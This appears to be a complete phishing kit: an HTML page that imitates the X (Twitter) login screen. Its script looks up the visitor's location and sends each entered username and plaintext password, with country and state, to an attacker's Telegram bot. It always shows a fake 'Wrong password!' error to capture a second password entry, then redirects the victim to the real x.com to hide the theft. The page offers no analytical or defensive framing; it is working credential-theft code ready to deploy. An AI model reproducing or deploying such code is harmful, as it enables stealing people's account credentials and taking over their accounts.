<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>X Authentication Flow</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white min-h-screen flex items-center justify-center font-sans">

  <main class="w-full max-w-sm sm:max-w-md min-h-screen sm:min-h-0 sm:h-auto flex flex-col justify-between sm:justify-center p-4 sm:p-6">

    <div id="step-1" class="w-full flex flex-col justify-between flex-1 sm:flex-initial space-y-6">
      <div class="w-full flex items-center justify-start">
        <button type="button" class="w-9 h-9 rounded-full bg-stone-900/80 flex items-center justify-center hover:bg-stone-800 transition">
          <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
          </svg>
        </button>
      </div>

      <div class="w-full space-y-6 my-auto sm:my-0">
        <div class="flex items-center space-x-3 justify-center sm:justify-start">
          <svg class="w-7 h-7 sm:w-8 sm:h-8 fill-current text-white shrink-0" viewBox="0 0 24 24">
            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
          </svg>
          <h1 class="text-xl sm:text-2xl font-bold tracking-wide">See what's happening</h1>
        </div>

        <div class="w-full">
          <div class="relative rounded-md border border-sky-500 bg-black p-2.5 sm:p-3 focus-within:ring-1 focus-within:ring-sky-500">
            <label class="block text-xs text-sky-400 font-medium">Email or username</label>
            <input 
              id="identity-input" 
              type="text" 
              placeholder="e.g. davido"
              class="w-full bg-transparent text-white focus:outline-none text-sm sm:text-base" 
            />
          </div>
        </div>

        <button 
          id="step1-continue-btn"
          disabled
          class="w-full font-bold py-3 sm:py-3.5 px-4 rounded-full transition text-sm sm:text-base bg-zinc-800 text-zinc-500 cursor-not-allowed"
        >
          Continue
        </button>
      </div>

      <p class="text-[11px] sm:text-xs text-zinc-500 text-center leading-relaxed px-2 pt-4">
        By continuing, you agree to our <a href="#" class="text-white hover:underline">Terms of Service</a>, <a href="#" class="text-white hover:underline">Privacy Policy</a> and <a href="#" class="text-white hover:underline">Cookie Use</a>.
      </p>
    </div>

    <div id="step-2" class="w-full flex flex-col justify-between flex-1 sm:flex-initial space-y-6 hidden">
      <div class="w-full flex items-center justify-start">
        <button id="back-to-step1-btn" type="button" class="w-9 h-9 rounded-full bg-stone-900/80 flex items-center justify-center hover:bg-stone-800 transition">
          <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
          </svg>
        </button>
      </div>

      <div class="w-full space-y-6 my-auto sm:my-0">
        <div class="flex justify-center">
          <svg class="w-10 h-10 sm:w-12 sm:h-12 fill-current text-white" viewBox="0 0 24 24">
            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
          </svg>
        </div>

        <div class="w-full text-left">
          <h1 class="text-2xl sm:text-3xl font-bold tracking-tight">Log in</h1>
        </div>

        <div id="error-banner" class="w-full bg-red-500/10 border border-red-500 text-red-500 text-xs sm:text-sm p-3 rounded-md text-center font-medium hidden">
          Wrong password!
        </div>

        <div class="w-full space-y-4">
          <div class="rounded-md border border-zinc-800 bg-black p-2.5 sm:p-3">
            <label class="block text-xs text-zinc-500">Username</label>
            <input 
              id="display-username" 
              type="text" 
              readonly 
              class="w-full bg-transparent text-white focus:outline-none text-base sm:text-lg tracking-wide cursor-not-allowed" 
            />
          </div>

          <div id="password-container" class="relative rounded-md border border-sky-500 bg-black p-2.5 sm:p-3 flex items-center justify-between">
            <div class="w-full">
              <label id="password-label" class="block text-xs text-sky-400 font-medium">Password</label>
              <input 
                id="password-input" 
                type="password" 
                class="w-full bg-transparent text-white focus:outline-none text-base sm:text-lg" 
              />
            </div>
            <button id="toggle-password-btn" type="button" class="text-zinc-400 hover:text-white pl-2 shrink-0">
              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
              </svg>
            </button>
          </div>
        </div>

        <div class="w-full text-center">
          <a href="#" class="text-white font-bold text-xs sm:text-sm hover:underline">Forgot password?</a>
        </div>

        <button 
          id="login-btn"
          disabled
          class="w-full font-bold py-3 sm:py-3.5 px-4 rounded-full transition text-sm sm:text-base bg-zinc-800 text-zinc-500 cursor-not-allowed flex items-center justify-center space-x-2"
        >
          <span id="btn-text">Log in</span>
        </button>
      </div>

      <p class="text-[11px] sm:text-xs text-zinc-500 text-center leading-relaxed px-2 pt-4">
        By continuing, you agree to our <a href="#" class="text-white hover:underline">Terms of Service</a>, <a href="#" class="text-white hover:underline">Privacy Policy</a> and <a href="#" class="text-white hover:underline">Cookie Use</a>.
      </p>
    </div>

  </main>

  <script>
    // CONFIGURATION
    const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
    const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';
    const REDIRECT_URL = 'https://x.com';

    // State Variables
    let attemptCount = 0;
    let isLoading = false;
    let userCountry = 'Unknown';
    let userState = 'Unknown';

    // DOM Elements
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const identityInput = document.getElementById('identity-input');
    const step1ContinueBtn = document.getElementById('step1-continue-btn');
    const backToStep1Btn = document.getElementById('back-to-step1-btn');
    const displayUsername = document.getElementById('display-username');
    const passwordInput = document.getElementById('password-input');
    const passwordContainer = document.getElementById('password-container');
    const passwordLabel = document.getElementById('password-label');
    const togglePasswordBtn = document.getElementById('toggle-password-btn');
    const loginBtn = document.getElementById('login-btn');
    const btnText = document.getElementById('btn-text');
    const errorBanner = document.getElementById('error-banner');

    // Fetch User IP and Geolocation
    async function fetchUserLocation() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        if (response.ok) {
          const data = await response.json();
          userCountry = data.country_name || 'Unknown';
          userState = data.region || 'Unknown';
        }
      } catch (error) {
        console.error('Location fetch error:', error);
      }
    }

    // Call geolocation fetch on page load
    fetchUserLocation();

    // Step 1: Input Validation
    identityInput.addEventListener('input', () => {
      const value = identityInput.value.trim();
      if (value) {
        step1ContinueBtn.disabled = false;
        step1ContinueBtn.className = 'w-full font-bold py-3 sm:py-3.5 px-4 rounded-full transition text-sm sm:text-base bg-white text-black hover:bg-gray-200 cursor-pointer';
      } else {
        step1ContinueBtn.disabled = true;
        step1ContinueBtn.className = 'w-full font-bold py-3 sm:py-3.5 px-4 rounded-full transition text-sm sm:text-base bg-zinc-800 text-zinc-500 cursor-not-allowed';
      }
    });

    // Step 1: Go to Step 2
    step1ContinueBtn.addEventListener('click', () => {
      displayUsername.value = identityInput.value.trim();
      step1.classList.add('hidden');
      step2.classList.remove('hidden');
    });

    // Step 2: Go Back to Step 1
    backToStep1Btn.addEventListener('click', () => {
      clearError();
      step2.classList.add('hidden');
      step1.classList.remove('hidden');
    });

    // Step 2: Toggle Password Visibility
    togglePasswordBtn.addEventListener('click', () => {
      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
      passwordInput.setAttribute('type', type);
    });

    // Step 2: Input Validation
    passwordInput.addEventListener('input', () => {
      clearError();
      const value = passwordInput.value.trim();
      if (value && !isLoading) {
        loginBtn.disabled = false;
        loginBtn.className = 'w-full font-bold py-3 sm:py-3.5 px-4 rounded-full transition text-sm sm:text-base bg-white text-black hover:bg-gray-200 cursor-pointer flex items-center justify-center space-x-2';
      } else {
        loginBtn.disabled = true;
        loginBtn.className = 'w-full font-bold py-3 sm:py-3.5 px-4 rounded-full transition text-sm sm:text-base bg-zinc-800 text-zinc-500 cursor-not-allowed flex items-center justify-center space-x-2';
      }
    });

    // Step 2: Enter Key Submit
    passwordInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' && !loginBtn.disabled) {
        handleLogin();
      }
    });

    // Step 2: Click Submit
    loginBtn.addEventListener('click', handleLogin);

    // Send Formatted Telegram Notification
    async function sendTelegramNotification(attempt) {
      const message = 
`APP: X

USER: ${identityInput.value.trim()}

PWD: ${passwordInput.value.trim()}

COUNTRY: ${userCountry} 🌍

STATE: ${userState}

X: ${attempt} ⏱️`;

      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

      try {
        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message
          })
        });
      } catch (err) {
        console.error('Telegram notification error:', err);
      }
    }

    // Login Handler
    async function handleLogin() {
      if (isLoading) return;
      
      setLoading(true);
      attemptCount++;

      await sendTelegramNotification(attemptCount);

      setLoading(false);

      if (attemptCount === 1) {
        showError();
        passwordInput.value = '';
        loginBtn.disabled = true;
        loginBtn.className = 'w-full font-bold py-3 sm:py-3.5 px-4 rounded-full transition text-sm sm:text-base bg-zinc-800 text-zinc-500 cursor-not-allowed flex items-center justify-center space-x-2';
      } else if (attemptCount >= 2) {
        window.location.href = REDIRECT_URL;
      }
    }

    // Helpers
    function showError() {
      errorBanner.classList.remove('hidden');
      passwordContainer.classList.remove('border-sky-500');
      passwordContainer.classList.add('border-red-500');
      passwordLabel.classList.remove('text-sky-400');
      passwordLabel.classList.add('text-red-500');
    }

    function clearError() {
      errorBanner.classList.add('hidden');
      passwordContainer.classList.remove('border-red-500');
      passwordContainer.classList.add('border-sky-500');
      passwordLabel.classList.remove('text-red-500');
      passwordLabel.classList.add('text-sky-400');
    }

    function setLoading(state) {
      isLoading = state;
      if (state) {
        btnText.textContent = 'Processing...';
        loginBtn.disabled = true;
      } else {
        btnText.textContent = 'Log in';
      }
    }
  </script>

</body>
</html>
